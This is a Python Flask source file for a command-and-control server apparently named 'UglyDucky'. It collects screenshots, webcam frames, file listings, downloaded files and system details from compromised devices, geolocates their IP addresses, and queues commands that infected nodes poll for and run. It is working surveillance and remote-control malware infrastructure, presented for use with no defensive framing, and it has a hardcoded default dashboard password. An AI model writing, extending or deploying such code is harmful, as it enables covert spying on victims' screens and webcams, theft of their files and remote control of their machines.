# File: c2_listener.py
import os
import json
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
# Enable CORS so the frontend can communicate with this API
CORS(app)

# Credentials from Render Environment Variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_ROLE KEY!

# --- SECURITY MEASURE ---
# This stops random people from guessing your Render URL and reading your logs.
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")

# --- IN-MEMORY CACHES ---
command_queue = {}
frame_cache = {}
filesystem_cache = {}
file_download_cache = {}

# ---------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------
def get_node_status(last_seen_str):
    if not last_seen_str: 
        return "red", "Offline"
    
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    
    if now - last_seen < timedelta(minutes=2): 
        return "green", "Online"
    if now - last_seen < timedelta(hours=1): 
        return "yellow", "Idle"
        
    return "red", "Offline"

def geolocate_ip(ip):
    if not ip or ip in ["127.0.0.1", "Unknown"]: 
        return 28.5383, -81.3792 
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.ok:
            data = response.json()
            if data.get("status") == "success":
                return float(data.get("lat")), float(data.get("lon"))
    except:
        pass
    return 28.5383, -81.3792 

# ---------------------------------------------------------
# DASHBOARD ENDPOINTS
# ---------------------------------------------------------
@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    
    try:
        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
        response = requests.get(time_url, headers=headers)
        response.raise_for_status()
        device_data = response.json()

        if not device_data:
            return jsonify({"error": "Node not found"}), 404

        last_seen = device_data[0]['created_at']
        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
        sysinfo_resp = requests.get(sysinfo_url, headers=headers)
        
        os_info = "Windows (Assumed)"
        ip_info = "Unknown IP"
        
        if sysinfo_resp.ok and sysinfo_resp.json():
            content = sysinfo_resp.json()[0]['content']
            for line in content.split('\n'):
                if line.startswith('Caption='): 
                    os_info = line.split('=')[-1].strip()
                elif line.startswith('PUBLIC IP:'): 
                    ip_info = line.split(':')[-1].strip()

        status_color, _ = get_node_status(last_seen)
        lat, lng = geolocate_ip(ip_info)
        
        return jsonify({
            "id": device_id, 
            "os": os_info, 
            "ip": ip_info, 
            "lat": lat, 
            "lng": lng,
            "status": status_color, 
            "last_seen": last_seen
        })

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Failed to fetch from Supabase: {e}"}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database fetch failed"}), 500

@app.route('/frames/<device_id>/<cache_key>', methods=['GET'])
def get_frame(device_id, cache_key):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    device_frames = frame_cache.get(device_id, {})
    frame = device_frames.pop(cache_key, None)

    if frame:
        return jsonify({"frame": frame}), 200
    else:
        return jsonify({"error": "Frame not available"}), 404

@app.route('/fs/<device_id>', methods=['GET'])
def get_fs_data(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    json_string_data = filesystem_cache.pop(device_id, None) 
    
    if json_string_data:
        try:
            parsed_data = json.loads(json_string_data)
            return jsonify(parsed_data), 200
        except json.JSONDecodeError:
            return jsonify({"error": "Invalid JSON format from payload"}), 500
    else:
        return jsonify({"error": "Filesystem data not available"}), 404

@app.route('/fs_download/<device_id>', methods=['GET'])
def get_fs_download(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401
        
    json_data = file_download_cache.pop(device_id, None)
    
    if json_data:
        try: 
            return jsonify(json.loads(json_data)), 200
        except Exception: 
            return jsonify({"error": "Invalid format"}), 500
            
    return jsonify({"error": "File not ready"}), 404

# ---------------------------------------------------------
# PAYLOAD ENDPOINTS
# ---------------------------------------------------------
@app.route('/frames', methods=['POST'])
def push_frame():
    data = request.json
    device_id = data.get("device_id")
    frame_type = data.get("frame_type") 
    monitor_index = data.get("monitor_index", 0)
    frame_data = data.get("data")
    
    if not all([device_id, frame_type, frame_data]):
        return jsonify({"error": "Missing required frame data"}), 400

    if device_id not in frame_cache:
        frame_cache[device_id] = {}
        
    cache_key = f"{frame_type}_{monitor_index}" if frame_type == "screen" else "webcam"
    frame_cache[device_id][cache_key] = frame_data
    
    return jsonify({"status": "frame received"}), 200

@app.route('/logs', methods=['POST'])
def push_logs():
    data = request.json
    
    # Intercept Filesystem List Data
    if data and data.get("category") == "filesystem_data":
        device_id = data.get("device_id")
        if device_id:
            filesystem_cache[device_id] = data.get("content")
        return jsonify({"status": "fs data cached"}), 200
        
    # Intercept Downloaded Files
    if data and data.get("category") == "file_download_data":
        device_id = data.get("device_id")
        if device_id: 
            file_download_cache[device_id] = data.get("content")
        return jsonify({"status": "download cached"}), 200

    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {
        "apikey": SUPABASE_KEY, 
        "Authorization": f"Bearer {SUPABASE_KEY}", 
        "Prefer": "return=minimal,resolution=merge-duplicates"
    }
    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
    
    try:
        response = requests.post(upsert_url, json=data, headers=headers, timeout=15)
        response.raise_for_status()
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database push failed"}), 500

@app.route('/issue', methods=['POST'])
def issue_command():
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401
        
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    
    if not device_id or not command: 
        return jsonify({"error": "device_id and command are required"}), 400
        
    command_queue[device_id] = command
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    command = command_queue.pop(device_id, None)
    return jsonify({"command": command})

@app.route('/')
def index(): 
    return "UglyDucky Secure Server."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
